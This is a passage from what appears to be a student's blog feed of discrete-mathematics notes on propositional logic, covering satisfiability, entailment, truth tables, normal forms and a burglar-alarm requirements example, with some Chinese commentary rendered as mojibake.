Requirements/Specifications</h2><p>Suppose a set of English language requirements $R$ for a software/hardware system can be formalised by a set of formulas {$Ï†_1$,â€¦,$Ï†_n$}.</p><p>Suppose $C$ is a statement formalised by a formula $Ïˆ$. Then</p><ol><li><p>The requirements cannot be implemented if $Ï†_1 âˆ§ â€¦ âˆ§ Ï†_n$ is not satisfiable.</p></li><li><p>If $Ï†_1,â€¦,Ï†_n$ entails $Ïˆ$ then every correct implementation of the requirements $R$ will be such that $C$ is always <strong>true</strong> in the resulting system.</p></li><li><p>If $Ï†<em>1,â€¦,Ï†</em>{nâˆ’1}$ entails $Ï†_n$, then the condition Ï†n of the specification is <strong>redundant</strong> and need not be stated in the specification.</p></li></ol><hr><p><img src="/2024/10/15/Math/Propositional-Logic/TTT1.png" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/TTT2.png" alt></p><hr><h3 id="Example-of-alarm-ringing"><a href="#Example-of-alarm-ringing" class="headerlink" title="Example of alarm ringing"></a>Example of alarm ringing</h3><p>Requirements R: A burglar alarm system for a house is to operate as follows. The alarm should not sound unless the system has been armed or there is a fire. If the system has been armed and a door is disturbed, the alarm should ring. Irrespective of whether the system has been armed, the alarm should go off when there is a fire.</p><p>Conclusion C: If the alarm is ringing and there is no fire, then the system must have been armed.</p><p><strong>Questions</strong></p><ol><li><p>Will every system correctly implementing requirements R satisfy C?</p></li><li><p>Is the final sentence of the requirements redundant?</p></li></ol><p>Expressing the requirements as formulas of propositional logic, with</p><ul><li>S = the alarm sounds = the alarm rings</li><li>A = the system is armed</li><li>D = a door is disturbed</li><li>F = there is a fire</li></ul><p>we get</p><p><strong>Requirements</strong>:</p><ol><li><p>$S â†’(Aâˆ¨F)$</p></li><li><p>$(Aâˆ§D)â†’S$</p></li><li><p>$F â†’S$</p></li></ol><p><strong>Conclusion</strong>:</p><script type="math/tex; mode=display">(S âˆ§ Â¬F) â†’ A</script><p>Our two questions then correspond to</p><ol><li><p>Does $S â†’(Aâˆ¨F), (Aâˆ§D)â†’S, F â†’S$ entail $(S âˆ§Â¬F) â†’A$ ?</p></li><li><p>Does $S â†’(Aâˆ¨F), (Aâˆ§D)â†’S$ entail $F â†’S$ ?</p></li></ol><h1 id="Propositional-Logic-formally"><a href="#Propositional-Logic-formally" class="headerlink" title="Propositional Logic, formally"></a>Propositional Logic, formally</h1><h2 id="Syntax-vs-Semantics"><a href="#Syntax-vs-Semantics" class="headerlink" title="Syntax vs Semantics"></a>Syntax vs Semantics</h2><p>The first step in the formal definition of logic is the separation of <strong>syntax</strong> and <strong>semantics</strong></p><ul><li><p>Syntax is how things are written: what defines a formula</p></li><li><p>Semantics is what things mean: what does it mean for a formula to be â€œtrueâ€?</p></li></ul><h3 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h3><p><strong>â€œRabbitâ€</strong> and <strong>â€œBunnyâ€</strong> are syntactically different, but semantically the same.</p><h2 id="Syntax-Well-formed-formulas"><a href="#Syntax-Well-formed-formulas" class="headerlink" title="Syntax: Well-formed formulas"></a>Syntax: Well-formed formulas</h2><p>Let $Prop =$ {p,q,r,â€¦} be a set of propositional letters. Consider the alphabet. (Prop is proposition)</p><script type="math/tex; mode=display">Î£=Propâˆª\{âŠ¤,âŠ¥,Â¬,âˆ§,âˆ¨,â†’,â†”,(,)\}.</script><p>Propå°±æ˜¯ä¹‹å‰æˆ‘ä»¬è¯´çš„ a(æ¡ä»¶aè¯­å¥),bï¼ˆæ¡ä»¶bè¯­å¥ï¼‰,c,d,e,C(å¸¸ä¸ºConclusion) è¿™äº›çš„ï¼Œç„¶åÎ£æ˜¯Propå¹¶ä¸Šé€»è¾‘æ¨ç†ç¬¦å·ã€‚</p><p>The <strong>well-formed</strong> <strong>formulas</strong> (wffs) over <strong>Prop</strong> is the smallest set of words over $Î£$ such that:</p><ul><li><strong>âŠ¤, âŠ¥ and all elements of Prop are wffs</strong></li><li>If Ï† is a wff then Â¬Ï† is a wf</li><li>If Ï† and Ïˆ are wffs then (Ï†âˆ§Ïˆ), (Ï†âˆ¨Ïˆ), (Ï† â†’ Ïˆ), and (Ï† â†”Ïˆ) are wffs.</li></ul><h3 id="Examples-2"><a href="#Examples-2" class="headerlink" title="Examples"></a>Examples</h3><p>The following are well-formed formulas:</p><ul><li>(p âˆ§Â¬âŠ¤)</li><li>Â¬(p âˆ§Â¬âŠ¤)</li><li>Â¬Â¬(p âˆ§Â¬âŠ¤)</li></ul><p>The following are <strong>not</strong> well-formed formulas:</p><ul><li>p âˆ§âˆ§</li><li>p âˆ§Â¬âŠ¤</li><li>(p âˆ§q âˆ§r)</li><li>Â¬(Â¬p)</li></ul><p>æ³¨æ„ï¼Œ<code>âˆ§</code>è¿™ç§æ“ä½œç¬¦ï¼ˆäºŒå…ƒæ“ä½œç¬¦ï¼‰ï¼Œå·¦å³å¿…é¡»æœ‰å€¼ï¼Œä¸”æ•´ä½“è¢«åœ†æ‹¬å·åŒ…è£¹ã€‚<code>Â¬(Â¬p)</code>ä¸æ˜¯wffæ˜¯å› ä¸ºÂ¬ä¸è¦åŠ æ‹¬å·ï¼Œç›´æ¥å†™<code>Â¬Â¬p</code>å°±æ˜¯wffã€‚</p><p><img src="/2024/10/15/Math/Propositional-Logic/wff.png" alt></p><h2 id="Syntax-Conventions"><a href="#Syntax-Conventions" class="headerlink" title="Syntax: Conventions"></a>Syntax: Conventions</h2><p>To aid readability some conventions and binding rules can and will be used [not in proof assistant].</p><p>Parentheses omitted if there is no ambiguity (e.g. p âˆ§ q)</p><p>Â¬ binds more tightly than âˆ§ and âˆ¨, which bind more tightly than â†’ and â†” (e.g. $p âˆ§q â†’ r$ instead of $((p âˆ§q) â†’ r)$</p><p>âˆ§ and âˆ¨ associate to the left: $pâˆ¨qâˆ¨r$ instead of $((pâˆ¨q)âˆ¨r)$</p><hr><p>To aid readability some conventions and binding rules can and will be used [not in proof assistant].</p><ul><li>Parentheses omitted if there is no ambiguity (e.g. p âˆ§ q)</li><li>Â¬ binds more tightly than âˆ§ and âˆ¨, which bind more tightly than â†’ and â†” (e.g. p âˆ§q â†’ r instead of ((p âˆ§q) â†’ r)</li><li>âˆ§ and âˆ¨ associate to the left: pâˆ¨qâˆ¨r instead of ((pâˆ¨q)âˆ¨r)</li></ul><p>Other conventions (rarely used/assumed in this lecture):</p><ul><li>â€² or $\overline{Â·}$ for Â¬</li><li>+ for âˆ¨</li><li>Â· or juxtaposition for âˆ§</li><li>âˆ§ binds more tightly than âˆ¨</li><li>â†’and â†”associate to the right: p â†’ q â†’ r instead of  (p â†’(q â†’r))</li></ul><h2 id="Syntax-Parse-trees"><a href="#Syntax-Parse-trees" class="headerlink" title="Syntax: Parse trees"></a>Syntax: Parse trees</h2><p>The structure of well-formed formulas (and other grammar-defined syntaxes) can be shown with a <strong>parse tree</strong>.</p><script type="math/tex; mode=display">((Pâˆ§Â¬Q)âˆ¨Â¬(Q â†’P))</script><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-11-37-20.png" alt></p><h2 id="Syntax-Parse-trees-formally"><a href="#Syntax-Parse-trees-formally" class="headerlink" title="Syntax: Parse trees formally"></a>Syntax: Parse trees formally</h2><p>Formally, we can define a parse tree as follows:</p><p>A parse tree is either:</p><ul><li>(B) A node containing âŠ¤;</li><li>(B) A node containing âŠ¥;</li><li>(B) A node containing a propositional variable;</li><li>(R) A node containing Â¬ with a single parse tree child; </li><li>(R) A node containing âˆ§ with two parse tree children;</li><li>(R) A node containing âˆ¨ with two parse tree children;</li><li>(R) A node containing â†’ with two parse tree children; or</li><li>(R) A node containing â†” with two parse tree children.</li></ul><h2 id="Semantics-Boolean-Algebras"><a href="#Semantics-Boolean-Algebras" class="headerlink" title="Semantics: Boolean Algebras"></a>Semantics: Boolean Algebras</h2><p>Recall the two-element Boolean Algebra</p><script type="math/tex; mode=display">\mathbb{B} =\{true,false\} = \{T,F\} = \{1,0\}</script><p>together with the operations <code>!, &amp;&amp;, âˆ¥</code>.</p><p>Define $â‡, â†­$ as derived boolean functions:</p><ul><li>x $â‡$y =(!x)âˆ¥y =max{1âˆ’x,y}</li><li>x $â†­$y=(x $â‡$y)&amp;&amp;(y $â‡$x)=(1+x+y)%2)</li></ul><p><img src="/2024/10/15/Math/Propositional-Logic/TT.jpg" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/TT2.jpg" alt></p><h2 id="Semantics-Truth-valuations"><a href="#Semantics-Truth-valuations" class="headerlink" title="Semantics: Truth valuations"></a>Semantics: Truth valuations</h2><p>A <strong>truth assignment</strong> is a function v : $Prop â†’ \mathbb{B}$.</p><p>We can extend a <strong>truth valuation</strong>, v, which assigns a value to all wffs of propositional logic as follows:</p><ul><li>v(âŠ¤) = true,</li><li>v(âŠ¥) = false,</li><li>v(Â¬Ï†) =!v(Ï†),</li><li>v(Ï† âˆ§Ïˆ) = v(Ï†) &amp;&amp; v(Ïˆ)</li><li>v(Ï† âˆ¨Ïˆ) = v(Ï†) âˆ¥ v(Ïˆ)</li><li><strong>v(Ï† â†’Ïˆ)=v(Ï†) â‡v(Ïˆ)</strong></li><li><strong>v(Ï† â†”Ïˆ)=v(Ï†) â†­v(Ïˆ)</strong></li></ul><hr><p>A truth assignment is a function v : $Prop â†’ \mathbb{B}$.</p><p>We can extend a truth valuation, v, to all wffs of propositional logic as follows:</p><ul><li>v(âŠ¤) = 1,</li><li>v(âŠ¥) = 0,</li><li>v(Â¬Ï†) = 1âˆ’v(Ï†),</li><li>v(Ï† âˆ§Ïˆ) = min{v(Ï†),v(Ïˆ)}</li><li>v(Ï† âˆ¨Ïˆ) = max{v(Ï†),v(Ïˆ)}</li><li><strong>v(Ï† â†’Ïˆ)=max{1âˆ’v(Ï†),v(Ïˆ)}</strong></li><li><strong>v(Ï† â†”Ïˆ)=(1+v(Ï†)+v(Ïˆ)) % 2</strong></li></ul><h2 id="Semantics-Exercises"><a href="#Semantics-Exercises" class="headerlink" title="Semantics: Exercises"></a>Semantics: Exercises</h2><p>Exercises</p><p>Evaluate the following formulas with the truth assignment $v(p) = v(q) = false$</p><ul><li>p â†’q </li></ul><p>true</p><ul><li>(p â†’q) â†’(p â†’q)</li></ul><p>true</p><ul><li>Â¬Â¬p</li></ul><p>false</p><ul><li>âŠ¤âˆ§Â¬âŠ¥â†’p</li></ul><p>false</p><h2 id="Semantics-Truth-tables"><a href="#Semantics-Truth-tables" class="headerlink" title="Semantics: Truth tables"></a>Semantics: Truth tables</h2><p>Row for every <strong>truth assignment</strong> â€” assignment of T/F to elements of Prop</p><p>Columns for <strong>subformulas</strong></p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-12-58-02.png" alt></p><h2 id="Satisfiability-and-Equivalence"><a href="#Satisfiability-and-Equivalence" class="headerlink" title="Satisfiability and Equivalence"></a>Satisfiability and Equivalence</h2><p>A formula Ï† is</p><ul><li><strong>satisfiable</strong> if v(Ï†) = true for some truth assignment v (v <strong>satisfies</strong> Ï†)</li><li>a <strong>tautology</strong> if v(Ï†) = true for all truth assignments v</li><li><strong>unsatisfiable</strong> or a <strong>contradiction</strong> if v(Ï†) = false for all truth assignments v</li></ul><h2 id="Example-Party-invitations"><a href="#Example-Party-invitations" class="headerlink" title="Example: Party invitations"></a>Example: Party invitations</h2><p> Translation to logic: let J,S,K represent â€œJohn (Sarah, Kim) comes to the partyâ€. Then the constraints are:</p><ol><li>J â†’ Â¬S</li><li>S â†’K</li><li>K â†’J</li></ol><p>Thus, for a successful party to be possible, we want the formula $Ïˆ =(J â†’Â¬S)âˆ§(S â†’K)âˆ§(K â†’J)$ to be satisfiable. Truth values for J,S,K making this true are called <strong>satisfying<br> assignments</strong>, or <strong>models</strong>.</p><p><strong>We figure out where the conjuncts are false</strong>, below. (so blank = T)</p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-13-01-37.png" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/TTTT3.jpg" alt></p><p>Conclusion: a party <strong>satisfying</strong> the constraints can be held. Invite nobody, or invite John only, or invite Kim and John.</p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-13-02-10.png" alt></p><h2 id="Logical-equivalence-1"><a href="#Logical-equivalence-1" class="headerlink" title="Logical equivalence"></a>Logical equivalence</h2><p>Definition</p><p>Two formulas, Ï† and Ïˆ, are <strong>logically equivalent</strong>, $Ï† â‰¡ Ïˆ, if v(Ï†) = v(Ïˆ)$ for all truth assignments v.</p><p>Fact</p><p>$â‰¡$ is an equivalence relation.</p><h3 id="properties"><a href="#properties" class="headerlink" title="properties"></a>properties</h3><p>For all propositions P,Q,R:</p><p>Commutativity</p><script type="math/tex; mode=display">P âˆ¨Q â‰¡ Qâˆ¨P \\P âˆ§Q â‰¡ Qâˆ§P</script><p>Associativity</p><script type="math/tex; mode=display">(P âˆ¨Q)âˆ¨R â‰¡ Pâˆ¨(Qâˆ¨R) \\(P âˆ§Q)âˆ§R â‰¡ Pâˆ§(Qâˆ§R)</script><p>Distributivity</p><script type="math/tex; mode=display">P âˆ¨(Q âˆ§R) â‰¡ (Pâˆ¨Q)âˆ§(Pâˆ¨R)\\P âˆ§(Q âˆ¨R) â‰¡ (Pâˆ§Q)âˆ¨(Pâˆ§R)</script><p>Identity</p><script type="math/tex; mode=display">P âˆ¨âŠ¥ â‰¡ P\\P âˆ§âŠ¤ â‰¡ P</script><p>Complement</p><script type="math/tex; mode=display">P âˆ¨Â¬P â‰¡ âŠ¤\\P âˆ§Â¬P â‰¡ âŠ¥</script><p>Other properties:</p><p>Implication: $p â†’ q â‰¡ Â¬p âˆ¨q$</p><p>Double negation: $Â¬Â¬p â‰¡ p$</p><p>Contrapositive: $(p â†’ q) â‰¡ (Â¬q â†’ Â¬p)$</p><p>De Morganâ€™s: $Â¬(p âˆ¨q) â‰¡ Â¬p âˆ§Â¬q$</p><p>Fact</p><p>$Ï† â‰¡Ïˆ$ if, and only if, $(Ï† â†” Ïˆ)$ is a tautology.</p><p>Strategies for showing logical equivalence:</p><ul><li>Compare all rows of truth table.</li><li>Show $(Ï† â†”Ïˆ)$ is a tautology.</li><li>Use <strong>transitivity</strong> of $â‰¡$.</li></ul><h3 id="exercise"><a href="#exercise" class="headerlink" title="exercise"></a>exercise</h3><p>Prove or disprove:</p><p>(a) $p â†’ (q â†’r) â‰¡ (p â†’q)â†’(p â†’r)$</p><p>(c) $(p â†’ q) â†’r â‰¡ pâ†’(qâ†’r)$</p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-13-09-54.png" alt></p><h2 id="Theories-and-entailment"><a href="#Theories-and-entailment" class="headerlink" title="Theories and entailment"></a>Theories and entailment</h2><p>A set of formulas is a <strong>theory</strong>: </p><script type="math/tex; mode=display">T = \{Ï†1,Ï†2,...,Ï†n\}</script><p>A truth assignment v <strong>satisfies</strong> a theory T, $if \quad v(Ï†i) = true \text{ for all } Ï†i âˆˆ T$</p><p>A theory T <strong>entails</strong> a formula $Ïˆ$, $T |= Ïˆ$, if $v(Ïˆ) = true$ for all truth assignments v which satisfy T</p><p>Take Notice</p><p>Other notation (when T = {$Ï†_1$,$Ï†_2$,â€¦,$Ï†_n$})</p><script type="math/tex; mode=display">Ï†_1,Ï†_2,...,Ï†_n |= Ï†\\Ï†_1,Ï†_2,...,Ï†_n, âˆ´ Ï†\\Ï†_1,Ï†_2,...,Ï†_n =â‡’ Ï†</script><h2 id="Entailment-and-Implication"><a href="#Entailment-and-Implication" class="headerlink" title="Entailment and Implication"></a>Entailment and Implication</h2><p>Theorem</p><p>The following are equivalent:</p><script type="math/tex; mode=display">Ï†_1,Ï†_2,...,Ï†_n |= Ïˆ\\âˆ… |= ((Ï†_1 âˆ§Ï†_2)âˆ§...Ï†_n) â†’ Ïˆ\\((Ï†_1 âˆ§ Ï†_2) âˆ§...Ï†_n) â†’ Ïˆ is a tautology\\âˆ… |= Ï†_1 â†’(Ï†_2 â†’(... â†’(Ï†_n â†’Ïˆ)...))\\Ï†_1 |= Ï†_2 â†’(... â†’ (Ï†_n â†’ Ïˆ)...)</script><p>These last two equivalences can be proven using the following fact.</p><p>Fact</p><p>Let T be a theory, and A and B be propositions. Then</p><script type="math/tex; mode=display">T |= Aâ†’B \text{ is equivalent to } T âˆª\{A\} |= B.</script><h2 id="Showing-entailment"><a href="#Showing-entailment" class="headerlink" title="Showing entailment"></a>Showing entailment</h2><p>Strategies for showing $Ï†_1,Ï†_2,â€¦,Ï†_n |= Ïˆ$:</p><ul><li>Draw a truth table with columns for $Ï†_1,â€¦,Ï†_n$ and $Ïˆ$. Check $Ïˆ$ is true in rows where <strong>all</strong> the $Ï†_i$ are true.</li><li>Show $((Ï†_1 âˆ§Ï†_2)âˆ§â€¦Ï†_n) â†’ Ïˆ$ is a tautology.</li><li>Show $Ï†_1 â†’(Ï†_2 â†’(â€¦ â†’ (Ï†_n â†’Ïˆ)â€¦))$ is a tautology.</li><li>Show $Ï†_1 |= Ï†_2 â†’ (â€¦ â†’ (Ï†_n â†’ Ïˆ)â€¦)$</li><li>Syntactic techniques: Natural deduction, Resolution, etc (not covered here)</li></ul><h3 id="Entailment-example"><a href="#Entailment-example" class="headerlink" title="Entailment example"></a>Entailment example</h3><p>Premises:</p><ul><li>Frank took the Ford or the Toyota.</li><li>If Frank took the Ford he will be late.</li><li>Frank is not late.</li></ul><p>Conclusion:</p><ul><li>Frank took the Toyota</li></ul><p>æ³¨æ„å¦‚æœä¸‰ä¸ªpremiseå…¨Tï¼Œåªæœ‰è¿™ä¸ªçº¢è‰²çš„Tè¿™ä¸€è¡Œï¼›åˆ™ä»ç»“è®ºå¯ä»¥çœ‹å‡ºè•´å«è¿™ä¼™åªå¯èƒ½å¼€Tytaã€‚è€Œæ— æ³•è•´å«å¼€Fordæ˜¯çœŸã€‚(è¿™å¥è¯æ˜¯~é”™çš„æ˜‚~ï¼åŸå­å‘½é¢˜æ˜¯Tæˆ–Fæ ¹æœ¬ä¸æ˜¯åˆ¤æ–­ä¾æ®ï¼Œæ ¹æœ¬æ— æ‰€è°“)</p><p>æˆ‘ä»¬æ‰¾çš„æ˜¯çœŸå€¼è¡¨ä¸­ï¼Œæ‰€æœ‰çº¦æŸæ¡ä»¶ä¸ºTçš„æƒ…å†µï¼ˆä¸<strong>åŸå­å‘½é¢˜</strong>æ˜¯Tã€Fæ— å…³ï¼ï¼‰æˆ‘ä»¬åªæ‰¾<strong>çº¦æŸå…¨T</strong>çš„æƒ…å†µä¸‹ï¼Œ<strong>Conclusionæ˜¯å¦ä¸ºT</strong>ï¼Œåˆ™è¯´æ˜å‡ ä¸ªçº¦æŸ(constraint)æ¨ç†åˆ°ç»“è®ºï¼ˆConclusionï¼‰æ˜¯è•´å«ï¼ˆentailmentï¼‰æœ‰æ•ˆçš„ï¼ˆvalidï¼‰ã€‚</p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-13-22-44.png" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-13-23-06.png" alt></p><p>å†çœ‹ä¸‹Sampleçš„é¢˜ï¼š</p><p><img src="/2024/10/15/Math/Propositional-Logic/ST1.png" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/ST2.png" alt></p><p>çœ‹åˆ°å‡ ä¸ªpremiseå…¨æ˜¯Tçš„è¡Œï¼Œå› æ­¤ <strong>the premises entail the conclusion</strong>. å› æ­¤  <strong>the argument is valid.</strong></p><h3 id="Example-Crewmates-and-Imposters"><a href="#Example-Crewmates-and-Imposters" class="headerlink" title="Example:Crewmates and Imposters"></a>Example:Crewmates and Imposters</h3><p>Because I did the note for the first time, there may be some mistake and insufficient understanding of the knowledge. Please refer to my the other articles to help: 1. <em>improper-atomic-and-entailment</em> 2. <em>truth-table-solves-imposter-and-crewmate</em></p><p>Premises: </p><ul><li>Everyoneiseitheracrewmate,oranimposter,<br>butnotboth</li><li>Red: â€œBlue is an imposterâ€</li><li>Green: â€œRed and Blue are both crewmatesâ€</li><li>Blue: â€œRed is a crewmate,or Green is an imposterâ€</li></ul><p>Conclusion: </p><ul><li>Green is an imposter</li></ul><p>Translation to logic: Let R, G, B represent â€œRed (Green, Blue) is a crewmateâ€.</p><p>Then the constraints are:</p><p>Premises:</p><ul><li>Everyone is either a crewmate, or an imposter, but not both</li><li>$Ï†_1 =R â†”Â¬B$</li><li>Green: â€œRed and Blue are both crewmatesâ€</li><li>Blue: â€œRed is a crewmate, or Green is an imposterâ€</li></ul><p>Conclusion: </p><ul><li>Green is an imposter</li></ul><p><img src="/2024/10/15/Math/Propositional-Logic/JT2.png" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-13-27-06.png" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-13-27-19.png" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-13-27-32.png" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-13-28-42.png" alt></p><h1 id="CNF-and-DNF-Revisited"><a href="#CNF-and-DNF-Revisited" class="headerlink" title="CNF and DNF Revisited"></a>CNF and DNF Revisited</h1><p>Definition</p><ul><li>A literal is an expression p or Â¬p, where p is a propositional atom.</li><li>A propositional formula is in CNF (conjunctive normal form) if it has the form</li></ul><script type="math/tex; mode=display">\underset{i}{\land}C_i \\% \lor</script><p>where each clause Ci is a disjunction of literals e.g.  $p âˆ¨qâˆ¨Â¬r$.</p><p>A propositional formula is in DNF (disjunctive normal form) if it has the form</p><script type="math/tex; mode=display">\underset{i}{\lor}C_i \\</script><p>where each <strong>clause</strong> $C_i$ is a conjunction of literals e.g. $p âˆ§qâˆ§Â¬r$.</p><p>Take Notice</p><p>CNF and DNF are syntactic forms.</p><p>Theorem</p><p>For every Boolean expression $Ï†$, there exists an equivalent expression in conjunctive normal form and an equivalent expression in disjunctive normal form.</p><h1 id="Beyond-Propositional-Logic"><a href="#Beyond-Propositional-Logic" class="headerlink" title="Beyond Propositional Logic"></a>Beyond Propositional Logic</h1><h2 id="Limitations-to-Propositional-Logic"><a href="#Limitations-to-Propositional-Logic" class="headerlink" title="Limitations to Propositional Logic"></a>Limitations to Propositional Logic</h2><p>Propositional logic is unable to capture several useful phenomena:</p><ul><li>Spatial/temporal dependence (e.g. P holds <strong>after</strong> Q holds)</li><li>Belief and knowledge (e.g. I know that you know that X holds)</li><li>Relationships between propositions (e.g. â€œThe sky is blueâ€ and â€œmy eyes are blueâ€)</li><li>Quantification (e.g. â€œAll men are mortalâ€)</li></ul><h2 id="Beyond-Propositional-Logic-1"><a href="#Beyond-Propositional-Logic-1" class="headerlink" title="Beyond Propositional Logic"></a>Beyond Propositional Logic</h2><p><strong>Modal logic</strong>: Introduce <strong>modalities</strong> to capture statement qualifying.</p><p>Example</p><p>Temporal logic:</p><ul><li>$F Ï†: Ï†$ will be true at some point in the future</li><li>$G Ï†: Ï†$ will be true at all points in the future</li><li>$Ï†U Ïˆ: Ï†$ will be true until $Ïˆ$ holds</li></ul><p><strong>First order logic/Predicate logic</strong>: Add relations (predicates) and quantifiers to capture relationships between propositions.</p><p>Example</p><ul><li>P: All men are mortal: $âˆ€x Man(x) â†’ Mortal(x)$</li><li>Q: Socrates is a man: $Man(Socrates)$</li><li>R: Socrates is mortal: $Mortal(Socrates)$</li></ul><p>In propositional logic, there is no connection between P, Q and R: it is not the case that $P,Q |= R$.</p><p>In first-order logic you can show $P,Q |= R$.</p><p><strong>Second order logic</strong>: Add quantification of relations.</p><h2 id="Limitations"><a href="#Limitations" class="headerlink" title="Limitations"></a>Limitations</h2><p>More expressive logics require more complex semantics.</p><ul><li>Logical equivalence harder to show</li><li>Entailment harder to show</li><li>Connections between different concepts not so straightforward</li></ul><p>Example</p><p>In Temporal Logic, a valuation is a function $v : Prop Ã— \mathbb{N} â†’ \mathbb{B}$ - i.e. truth tables that change over time.</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å­¦æ¸£è€ƒè¯•ç­”é¢˜æ¨¡æ¿</title>
      <link href="/2024/10/14/Math/%E5%AD%A6%E6%B8%A3%E8%80%83%E8%AF%95%E7%AD%94%E9%A2%98%E6%A8%A1%E6%9D%BF/"/>
      <url>/2024/10/14/Math/%E5%AD%A6%E6%B8%A3%E8%80%83%E8%AF%95%E7%AD%94%E9%A2%98%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/10/14/Math/%E5%AD%A6%E6%B8%A3%E8%80%83%E8%AF%95%E7%AD%94%E9%A2%98%E6%A8%A1%E6%9D%BF/answer.jpg" alt></p><p>æ­£å¦‚tutoræ‰€è¨€ï¼Œ</p><h1 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h1><p>Given</p><h1 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h1><p>To prove</p><h1 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h1><p>Hence</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Domain Set Cross Product and values</title>
      <link href="/2024/10/13/Math/Domain-Set-Cross-Product-and-values/"/>
      <url>/2024/10/13/Math/Domain-Set-Cross-Product-and-values/</url>
      
        <content type="html"><![CDATA[<p>Firstly, take notice that we cannot add brackets of cross product, which are totally different.</p><script type="math/tex; mode=display">A \times A \times A \neq (A \times A) \times A \neq A \times (A \times A)</script><p><img src="/2024/10/13/Math/Domain-Set-Cross-Product-and-values/111.png" alt></p><p>And, take notice of the <strong>on</strong>. If <strong>on N</strong>, means <strong>aRb</strong>, itâ€™s a pair <strong>(a,b)</strong>. If <strong>on $\mathbb{N} \times \mathbb{N}$</strong>, its <strong>(a,b)R(c,d)</strong>, namely <strong>((a,b),(c,d))</strong>.</p><p><img src="/2024/10/13/Math/Domain-Set-Cross-Product-and-values/domain_of_pairs.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Boolean logic</title>
      <link href="/2024/10/12/Math/Boolean-logic/"/>
      <url>/2024/10/12/Math/Boolean-logic/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#what-is-logic">What is logic</a><ul><li><a href="#loose-history-of-logic">Loose history of logic</a></li><li><a href="#logic-in-computer-science">Logic in Computer Science</a></li></ul></li><li><a href="#boolean-logic">Boolean Logic</a><ul><li><a href="#the-boolean-algebra-mathbbb">The Boolean Algebra $\mathbb{B}$</a></li><li><a href="#alternative-notation">Alternative notation</a></li><li><a href="#alternative-notation-1">Alternative notation</a></li><li><a href="#propertiescommutativityassociativitydistributionidentitycomplementation">Properties:Commutativity,Associativity,Distribution,Identity,Complementation</a></li></ul></li><li><a href="#boolean-functions">Boolean Functions</a><ul><li><a href="#example">example</a></li><li><a href="#application-adding-two-one-bit-numbers">Application: Adding two one-bit numbers</a></li></ul></li><li><a href="#conjunctive-and-disjunctive-normal-form">Conjunctive and Disjunctive Normal Form</a><ul><li><a href="#examples">Examples</a></li><li><a href="#2-theorems">2 Theorems</a></li></ul></li><li><a href="#canonical-dnf">Canonical DNF</a><ul><li><a href="#theorem">Theorem</a></li><li><a href="#exercise">Exercise</a></li></ul></li><li><a href="#karnaugh-maps">Karnaugh Maps</a><ul><li><a href="#proof-process-of-karnaugh-maps-k-maps-for-short">proof process of Karnaugh Maps (K Maps for short)</a></li><li><a href="#why-how-to-use-karnaugh-maps">Why, how to use Karnaugh Maps</a></li><li><a href="#how-to-correctly-circle-to-eliminate-variables">how to correctly circle to eliminate variables?</a></li><li><a href="#example-1">example</a></li><li><a href="#exercise-1">Exercise</a></li></ul></li><li><a href="#boolean-algebras">Boolean Algebras</a><ul><li><a href="#definition">definition</a></li><li><a href="#property">property</a></li><li><a href="#example-2">Example</a></li><li><a href="#proofs-in-boolean-algebras">Proofs in Boolean Algebras</a></li><li><a href="#duality">Duality</a><ul><li><a href="#definition-1">Definition</a></li><li><a href="#definition-2">Definition</a></li><li><a href="#theorem-principle-of-duality">Theorem (Principle of duality)</a></li><li><a href="#example-3">Example</a></li></ul></li></ul></li></ul><h1 id="What-is-logic"><a href="#What-is-logic" class="headerlink" title="What is logic"></a>What is logic</h1><p>Logic is about <strong>formalizing reasoning</strong> and <strong>defining truth</strong></p><ul><li>Adding rigour</li><li>Removing ambiguity</li><li>Mechanizing the process of reasoning</li></ul><h2 id="Loose-history-of-logic"><a href="#Loose-history-of-logic" class="headerlink" title="Loose history of logic"></a>Loose history of logic</h2><p>(Ancient times): Logic exclusive to philosophy<br>Mid-19th Century: Logical foundations of Mathematics (Boole, Jevons, SchrÂ¨oder, etc)<br>1910: Russell and Whiteheadâ€™s Principia Mathematica<br>1928: Hilbert proposes Entscheidungsproblem<br>1931: GÂ¨odelâ€™s Incompleteness Theorem<br>1935: Churchâ€™s Lambda calculus<br>1936: Turingâ€™s Machine-based approach<br>1930s: Shannon develops Circuit logic<br>1960s: Formal verification; Relational databases</p><h2 id="Logic-in-Computer-Science"><a href="#Logic-in-Computer-Science" class="headerlink" title="Logic in Computer Science"></a>Logic in Computer Science</h2><p>Computation = Calculation + Symbolic manipulation</p><p>Logic as 2-valued computation (Boolean logic):</p><ul><li>Circuit design</li><li>Code optimization</li><li>Boolean algebra</li><li>Nand game</li></ul><p>Logic as symbolic reasoning (Propositional logic, and beyond):</p><ul><li>Formal verification</li><li>Proof assistance</li><li>Knowledge Representation and Reasoning</li><li>Automated reasoning</li><li>Databases</li></ul><h1 id="Boolean-Logic"><a href="#Boolean-Logic" class="headerlink" title="Boolean Logic"></a>Boolean Logic</h1><p>Boolean logic is about performing calculations in a â€œsimpleâ€ mathematical structure.</p><ul><li>complex 